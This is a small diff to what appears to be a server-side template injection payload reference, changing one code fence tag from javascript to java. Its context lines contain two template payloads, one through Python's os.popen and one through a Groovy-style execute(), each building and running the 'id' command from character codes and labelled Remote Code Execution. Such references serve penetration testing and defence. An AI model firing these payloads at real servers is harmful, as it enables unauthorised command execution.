@@ -94,7 +94,7 @@ ${{'{'}}self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).rea
 
 **Impact:** Remote Code Execution (RCE)
 
-```javascript
+```java
 ${{'{'}}x=new String();for(i in[105,100]){{'{'}}x+=((char)i).toString()};x.execute().text}
 ```
 
